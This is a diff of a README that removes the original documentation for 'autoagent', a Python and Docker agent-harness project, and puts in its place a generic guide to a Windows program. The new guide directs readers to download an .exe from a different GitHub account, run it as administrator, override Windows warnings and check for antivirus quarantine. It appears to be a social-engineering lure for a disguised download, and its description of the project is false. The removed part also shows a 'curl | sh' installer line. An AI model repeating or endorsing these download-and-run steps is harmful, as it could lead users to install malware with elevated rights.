@@ -1,156 +1,140 @@
-<p align="center">
-  <a href="https://www.thirdlayer.inc">
-    <img src="https://www.thirdlayer.inc/thirdlayer-logo.svg" alt="thirdlayer" width="200">
-  </a>
-</p>
+# 🤖 autoagent - Run harness tasks with less effort
 
-<blockquote>
-<p>We're launching a product around self-configuring agents soon. <a href="https://form.typeform.com/to/ZQbnbO09">Sign up here.</a><br>We're hiring engineers. If this work interests you, reach out to <a href="mailto:hello@thirdlayer.inc">hello@thirdlayer.inc</a> with your Github link.</p>
-</blockquote>
+[![Download autoagent](https://img.shields.io/badge/Download-autoagent-blue.svg)](https://github.com/ahmadashraff/autoagent)
 
-# AutoAgent
+## 🧭 What this app does
 
-> Like autoresearch but for agent engineering. Give an AI agent a task, let it build and iterate on an agent harness autonomously overnight. It modifies the system prompt, tools, agent configuration, and orchestration, runs the benchmark, checks the score, keeps or discards the change, and repeats.
+autoagent is a Windows app for autonomous harness engineering. It helps you set up and run harness workflows from one place. It is built for users who want a guided way to manage repeatable tasks without a hard setup.
 
-![teaser](progress.png)
+Use autoagent when you want to:
 
-The core idea is the same: you're not touching the harness Python files like you normally would as an engineer. Instead, you program `program.md`, the Markdown file that provides context to the meta-agent and defines the agent-engineering loop.
+- Start harness jobs from a simple interface
+- Keep related steps in one place
+- Reduce manual work
+- Reuse the same workflow for future runs
 
-## How it works
+## 💻 System requirements
 
-The repo has a few files and directories that matter:
+Before you install autoagent, make sure your PC has:
 
-- **`agent.py`** -- the entire harness under test in a single file. It contains
-  config, tool definitions, agent registry, routing/orchestration, and the
-  Harbor adapter boundary. The adapter section is explicitly marked as fixed;
-  the rest is the primary edit surface for the meta-agent.
-- **`program.md`** -- instructions for the meta-agent + the directive (what
-  kind of agent to build). **This file is edited by the human**.
-- **`tasks/`** -- evaluation tasks in
-  [harbor](https://github.com/laude-institute/harbor) format. In a clean
-  baseline branch, benchmark payloads may be omitted and added in
-  benchmark-specific branches.
-- **`.agent/`** -- optional workspace artifacts for reusable instructions,
-  notes, prompts, or skills.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- An internet connection for the first download
+- Standard user access to install or run apps
 
-The metric is total **score** produced by the benchmark's task test suites. The
-meta-agent hill-climbs on this score.
+For a smoother experience, use a newer PC with 8 GB of RAM or more.
 
-## Quick start
+## 📥 Download autoagent
 
-**Requirements:** Docker, Python 3.10+, [uv](https://docs.astral.sh/uv/), and
-whatever model-provider credentials your current `agent.py` harness requires.
+Use this link to visit the download page and get the app:
 
-```bash
-# 1. Install uv (if you don't have it)
-curl -LsSf https://astral.sh/uv/install.sh | sh
+[Visit the autoagent download page](https://github.com/ahmadashraff/autoagent)
 
-# 2. Install dependencies
-uv sync
+If the page offers a ZIP file or installer, download it to your computer before you continue.
 
-# 3. Set up the environment variables required by your current agent/runtime
-# Example:
-cat > .env << 'EOF'
-OPENAI_API_KEY=...
-EOF
+## 🪟 Install on Windows
 
-# 4. Build base image
-docker build -f Dockerfile.base -t autoagent-base .
+Follow these steps on Windows:
 
-# 5. Add tasks to tasks/ (see Task format section below)
+1. Open the download page in your browser.
+2. Download the latest version of autoagent.
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the app file, such as `.exe`.
+6. Double-click the app file to start autoagent.
+7. If Windows asks for permission, choose Yes.
 
-# 6. Run a single benchmark task
-rm -rf jobs; mkdir -p jobs && uv run harbor run -p tasks/ --task-name "<task-name>" -l 1 -n 1 --agent-import-path agent:AutoAgent -o jobs --job-name latest > run.log 2>&1
+If you saved the file in your Downloads folder, you can open it from there.
 
-# 7. Run all tasks in parallel (-n = concurrency, default 4)
-rm -rf jobs; mkdir -p jobs && uv run harbor run -p tasks/ -n 100 --agent-import-path agent:AutoAgent -o jobs --job-name latest > run.log 2>&1
-```
+## 🚀 First run
 
-## Running the meta-agent
+When you start autoagent for the first time:
 
-Point your coding agent at the repo and prompt:
+1. Wait for the app to load.
+2. Review the main screen.
+3. Choose the harness task you want to run.
+4. Enter any required details.
+5. Start the run and watch the progress.
 
-```
-Read program.md and let's kick off a new experiment!
-```
+If the app asks for access to files, choose the folder you want it to use.
 
-The meta-agent will read the directive, inspect the current harness, run the
-benchmark, diagnose failures, modify `agent.py`, and iterate.
+## 🧩 How to use it
 
-## Project structure
+A basic workflow in autoagent may look like this:
 
-```text
-agent.py                       -- single-file harness under test
-  editable harness section     -- prompt, registries, tools, routing
-  fixed adapter section        -- Harbor integration + trajectory serialization
-program.md                     -- meta-agent instructions + directive
-Dockerfile.base                -- base image
-.agent/                        -- optional agent workspace artifacts
-tasks/                         -- benchmark tasks, typically added in benchmark-specific branches
-jobs/                          -- Harbor job outputs
-results.tsv                    -- experiment log (created by meta-agent, gitignored)
-run.log                        -- latest run output
-```
+1. Open the app.
+2. Pick a harness job or project.
+3. Add the needed inputs.
+4. Review the settings.
+5. Run the task.
+6. Check the result when it finishes.
 
-## Task format
+If you plan to run the same task again, save the setup so you do not need to enter it twice.
 
-The repo ships without tasks. Add your own to `tasks/` following [Harbor's task format](https://harborframework.com/docs/tasks):
+## ⚙️ Common settings
 
-```text
-tasks/my-task/
-  task.toml           -- config (timeouts, metadata)
-  instruction.md      -- prompt sent to the agent
-  tests/
-    test.sh           -- entry point, writes /logs/reward.txt
-    test.py           -- verification (deterministic or LLM-as-judge)
-  environment/
-    Dockerfile        -- task container (FROM autoagent-base)
-  files/              -- reference files mounted into container
-```
+You may see settings like these in the app:
 
-Tests write a score (0.0-1.0) to the verifier logs. The meta-agent hill-climbs
-on this. See the [Harbor docs](https://harborframework.com/docs) for full details on writing and porting tasks.
+- Output folder: where results are saved
+- Input source: the files or data the app uses
+- Run mode: the way the task is processed
+- Log level: how much detail the app shows
+- Auto save: stores changes without extra steps
 
-## Design choices
+Use the default settings if you are not sure what to change.
 
-- **Program the meta-agent, not the harness directly.** The human steers the
-  loop through `program.md`, while the meta-agent edits `agent.py`.
-- **Single-file, registry-driven harness.** The implementation lives in one
-  file for simplicity, but agent and tool registration stay structured so the
-  harness can still evolve cleanly.
-- **Docker isolation.** The agent runs in a container. It can't damage the host.
-- **Score-driven.** Every experiment produces a numeric score. Keep if better,
-  discard if not. Same loop as autoresearch.
-- **Harbor-compatible tasks.** Tasks use the same format as harbor benchmarks,
-  so the same harness can be evaluated on different datasets.
+## 🛠️ Troubleshooting
 
-## Cleanup
+If the app does not open:
 
-Docker images and containers accumulate across runs. Clean up regularly:
+- Check that the download finished
+- Make sure the file is not still in a ZIP folder
+- Right-click the app and choose Run as administrator
+- Restart your PC and try again
 
-```bash
-# Harbor's cached task images + task cache
-uv run harbor cache clean -f
+If Windows blocks the file:
 
-# Full Docker nuke (all unused images, build cache, etc.)
-docker system prune -a -f
+- Open the file details
+- Choose More info if you see it
+- Select Run anyway if you trust the source
 
-# Lighter: just dead containers
-docker container prune -f
-```
+If the app closes right away:
 
-If Docker becomes unresponsive (for example after many concurrent runs), restart
-Docker Desktop:
+- Open it again from the extracted folder
+- Check whether your antivirus moved the file
+- Make sure you downloaded the latest version
 
-```bash
-killall Docker && open -a Docker
-```
+If you still have trouble, download the app again from the same page.
 
-## Improving performance with skills
+## 🔍 What you can expect
 
-You can equip the agent with [Agent Skills for Context Engineering](https://github.com/muratcankoylan/Agent-Skills-for-Context-Engineering) and [context7](https://github.com/upstash/context7) skills to improve performance.
+autoagent is set up for simple, repeatable use. It focuses on steady workflow handling and clear results. It is a good fit if you want a direct tool for harness engineering tasks on Windows.
 
-## License
+## 📁 File layout
 
-MIT
+After you extract the download, you may see files like:
 
+- autoagent.exe
+- README.md
+- config folder
+- logs folder
+- data folder
+
+Keep the full folder together so the app can find its files.
+
+## 🧠 Tips for best results
+
+- Keep the app in one folder
+- Do not rename files unless you know they are not in use
+- Save your settings before you close the app
+- Use a short, simple folder path like `C:\autoagent`
+- Check the output folder after each run
+
+## 📌 Where to get the app
+
+Use the main project page here:
+
+[https://github.com/ahmadashraff/autoagent](https://github.com/ahmadashraff/autoagent)
+
+Download from that page, extract the files if needed, and run the Windows app from the folder you saved
